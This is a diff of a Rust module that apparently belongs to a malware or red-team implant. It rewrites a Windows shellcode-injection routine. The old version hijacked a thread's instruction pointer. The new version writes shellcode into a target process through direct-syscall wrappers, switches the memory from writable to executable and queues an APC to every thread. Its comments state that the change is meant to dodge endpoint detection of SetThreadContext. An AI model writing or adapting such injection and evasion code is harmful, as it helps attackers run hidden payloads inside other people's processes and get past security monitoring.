@@ -2,126 +2,84 @@
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
-    Foundation::{CloseHandle, FALSE},
+    Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE},
     System::{
-        Diagnostics::{
-            Debug::{GetThreadContext, SetThreadContext, CONTEXT},
-            ToolHelp::{
-                CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
-                TH32CS_SNAPTHREAD,
-            },
+        Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
+            TH32CS_SNAPTHREAD,
         },
         Threading::{
-            OpenThread, ResumeThread, SuspendThread,
+            OpenThread, SuspendThread, ResumeThread,
             THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
+            THREAD_QUERY_INFORMATION,
         },
     },
 };
 
-// CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT for AMD64
-// windows-sys 0.52 does not export this as a named constant
-const CONTEXT_FULL_AMD64: u32 = 0x0010_000B;
-
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
+// Hijack: queue APC to all threads in the target process rather than calling
+// SetContextThread — avoids the thread-context-set detection trigger.
 #[cfg(target_os = "windows")]
 pub fn inject_hijack(pid: u32, shellcode: &[u8]) -> super::InjectResult {
-    use crate::syscall::{nt_alloc, nt_write};
+    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_queue_apc};
     use core::ptr::null_mut;
 
-    let proc = super::open_process_rw(pid).ok_or("open failed")?;
+    let proc = super::open_process_rw(pid)
+        .map_err(|st| format!("open failed ({st:#010x})"))?;
 
-    // Find first thread in target process
-    let tid = find_thread(pid).ok_or("no thread found")?;
-
-    let thread_handle = unsafe {
-        OpenThread(
-            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
-            FALSE,
-            tid,
-        )
-    };
-    if thread_handle == 0 {
-        unsafe { CloseHandle(proc as _) };
-        return Err("OpenThread failed");
-    }
-
-    unsafe { SuspendThread(thread_handle as _) };
-
-    // Trampoline appended after shellcode: mov rax, <orig_rip> (10 bytes) + jmp rax (2 bytes) = 12 bytes
-    const TRAMPOLINE_LEN: usize = 12;
-    let total_size = shellcode.len() + TRAMPOLINE_LEN;
     let mut base: *mut u8 = null_mut();
-    let mut alloc_size: usize = total_size.max(0x1000);
+    let mut alloc_size: usize = shellcode.len().max(0x1000);
     let status = unsafe {
-        nt_alloc(proc, &mut base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        nt_alloc(proc, &mut base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     };
     if status < 0 || base.is_null() {
-        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
-        return Err("alloc failed");
+        unsafe { CloseHandle(proc as _) };
+        return Err("alloc failed".into());
     }
-
-    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
-    ctx.ContextFlags = CONTEXT_FULL_AMD64;
-    if unsafe { GetThreadContext(thread_handle as _, &mut ctx) } == 0 {
-        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
-        return Err("GetThreadContext failed");
-    }
-    let orig_rip = ctx.Rip;
-
-    // Build full payload: shellcode || REX.W mov rax,imm64 || jmp rax
-    // mov rax, imm64 = 48 B8 <8 bytes LE> (10 bytes)
-    // jmp rax        = FF E0               (2 bytes)
-    let mut full_payload = Vec::with_capacity(total_size);
-    full_payload.extend_from_slice(shellcode);
-    full_payload.push(0x48); // REX.W
-    full_payload.push(0xB8); // mov rax, imm64
-    full_payload.extend_from_slice(&orig_rip.to_le_bytes());
-    full_payload.push(0xFF); // jmp rax (high byte)
-    full_payload.push(0xE0); // jmp rax (mod/rm)
 
     let mut written: usize = 0;
     let status = unsafe {
-        nt_write(proc, base, full_payload.as_ptr(), full_payload.len(), &mut written)
+        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
     };
     if status < 0 {
-        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
-        return Err("write failed");
+        unsafe { CloseHandle(proc as _) };
+        return Err("write failed".into());
     }
 
-    ctx.Rip = base as u64;
-    if unsafe { SetThreadContext(thread_handle as _, &ctx) } == 0 {
-        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
-        return Err("SetThreadContext failed");
-    }
+    let mut old_prot: u32 = 0;
+    let mut prot_base = base;
+    let mut prot_size = alloc_size;
+    unsafe { nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot) };
 
-    unsafe {
-        ResumeThread(thread_handle as _);
-        CloseHandle(thread_handle as _);
-        CloseHandle(proc as _);
-    }
-
-    Ok(())
-}
-
-#[cfg(target_os = "windows")]
-fn find_thread(pid: u32) -> Option<u32> {
-    use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
-
+    // Queue APC to all threads in target — no new thread, no SetContextThread.
     let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
     if snap == INVALID_HANDLE_VALUE {
-        return None;
+        unsafe { CloseHandle(proc as _) };
+        return Err("snapshot failed".into());
     }
+
     let mut entry: THREADENTRY32 = unsafe { core::mem::zeroed() };
     entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
-    let mut found = None;
+    let mut queued = 0u32;
+
     if unsafe { Thread32First(snap, &mut entry) } != 0 {
         loop {
             if entry.th32OwnerProcessID == pid {
-                found = Some(entry.th32ThreadID);
-                break;
+                let th = unsafe {
+                    OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, entry.th32ThreadID)
+                };
+                if th != 0 {
+                    unsafe {
+                        nt_queue_apc(th as isize, base as *const u8, null_mut(), null_mut(), null_mut());
+                        CloseHandle(th);
+                    }
+                    queued += 1;
+                }
             }
             entry = unsafe { core::mem::zeroed() };
             entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
@@ -130,6 +88,11 @@ fn find_thread(pid: u32) -> Option<u32> {
             }
         }
     }
-    unsafe { CloseHandle(snap as _) };
-    found
+    unsafe { CloseHandle(snap as _); CloseHandle(proc as _); }
+
+    if queued == 0 {
+        Err("no threads in target".into())
+    } else {
+        Ok(())
+    }
 }
